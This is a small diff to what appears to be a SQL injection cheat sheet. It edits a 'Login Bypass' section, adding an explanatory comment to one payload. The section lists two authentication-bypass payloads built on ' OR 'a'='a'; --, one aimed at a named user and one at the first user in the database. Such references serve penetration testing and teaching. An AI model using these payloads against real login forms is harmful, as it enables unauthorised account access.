@@ -12,6 +12,6 @@ SQL injection command
 ----------------
 [ Login Bypass ] 
 
-<username>' OR 'a'='a'; -- 
+<username>' OR 'a'='a'; -- // login bypass for specific user
 ' OR 'a'='a'; -- // Note that this will login bypass for the first user in the database
 ----------------
